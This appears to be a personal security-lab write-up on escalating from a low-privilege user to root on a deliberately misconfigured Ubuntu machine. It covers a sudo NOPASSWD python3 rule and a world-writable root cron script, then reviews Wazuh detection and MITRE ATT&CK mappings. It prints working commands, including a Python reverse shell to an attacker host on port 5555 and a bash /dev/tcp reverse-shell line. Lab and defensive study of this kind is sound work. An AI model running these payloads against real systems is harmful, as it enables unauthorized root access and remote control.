# Session 8 — Privilege Escalation — Linux

## Objective
Escalate from a low-privilege user (jesus-carranza) to root
using two misconfiguration vectors found on Ubuntu_principal
after gaining initial access via the reverse shell in Session 7.

## Environment
- Shell: reverse shell from Session 7 as jesus-carranza
- Target: Ubuntu_principal (192.168.100.27)
- Tools: sudo, cron, netcat, Python 3

## Intentional misconfigurations created

### 1. sudo NOPASSWD for python3
    jesus-carranza ALL=(ALL) NOPASSWD: /usr/bin/python3

### 2. Cron job running as root with world-writable script
    /etc/cron.d/backup: * * * * * root /opt/backup.sh
    /opt/backup.sh permissions: -rwxrwxrwx (chmod 777)

## Vector 1 — sudo NOPASSWD exploitation

### Why it is exploitable
The admin allowed python3 to run without a password for automation
purposes. Python has access to os.system() which executes any OS
command. Since python3 runs as root, os.system("/bin/bash") opens
a root shell inheriting root privileges.

    sudo python3 runs as root
    python3 calls os.system()  →  subprocess inherits root uid
    os.system("/bin/bash")     →  bash opens as root

### Execution
    # Enumerate sudo permissions
    sudo -l

    # Stabilize shell first
    python3 -c 'import pty;pty.spawn("/bin/bash")'

    # Exploit
    sudo python3 -c 'import os; os.system("/bin/bash")'

    # Verify
    whoami   # root
    id       # uid=0(root)

## Vector 2 — Cron job with writable script

### Why it is exploitable
Two conditions must exist simultaneously:
1. A task runs automatically as root (/etc/cron.d/backup)
2. The script it executes is writable by any user (chmod 777)

If you control what root executes, you control root.

### Execution
    # Verify both conditions
    cat /etc/cron.d/backup
    ls -la /opt/backup.sh

    # Write Python reverse shell to the script
    # (bash redirection did not work reliably in the
    # non-interactive reverse shell environment)
    cat > /opt/backup.sh << 'EOF'
    #!/usr/bin/python3
    import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("192.168.100.24",5555))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call(["/bin/bash","-i"])
    EOF
    chmod +x /opt/backup.sh

    # Start listener on Kali BEFORE the cron fires
    nc -lvnp 5555

    # Wait up to 60 seconds — cron runs every minute
    # Connection arrives as root automatically

## Troubleshooting

### Problem: bash reverse shell in cron did not connect (~10 attempts)
The classic bash redirect payload (bash -i >& /dev/tcp/IP/PORT 0>&1)
failed silently when executed by cron. Root cause: cron runs scripts
in a non-interactive, minimal environment — bash redirection operators
behave differently without a proper TTY.

Fix: replaced bash payload with a Python reverse shell using the same
socket technique from Session 7. Python's socket module does not
depend on shell features and works consistently in non-interactive
environments.

### Problem: crontab -e control characters not working
Ctrl+X, Ctrl+C and arrow keys sent escape sequences (^[[) instead
of editor commands. Root cause: the reverse shell is not a full TTY
so interactive editors do not work properly.

Fix: used echo/printf/cat heredoc to write the cron job directly
without opening an editor.

### Problem: cron running but no connection arriving
Confirmed cron was executing (auth.log showed session opened for
root every minute) but the connection never arrived.
Root cause: the bash payload was failing silently inside cron's
minimal shell environment.
Fix: Python payload as described above.

## Key lesson
A bash payload that works in an interactive shell may not work
when executed by cron. Always test payloads in the same environment
where they will run. Python is more portable for reverse shells
because it does not rely on shell-specific syntax.

## Detection in Wazuh
- Wazuh FIM would detect modifications to /opt/backup.sh
- Auth.log shows cron session opened for root every minute
- The outbound connection on port 5555 was not detected
  (same gap as Session 7 — addressed in Session 10)

## MITRE ATT&CK
- T1548.003 — Abuse Elevation Control Mechanism: Sudo
- T1053.003 — Scheduled Task/Job: Cron
- T1059.006 — Command and Scripting Interpreter: Python
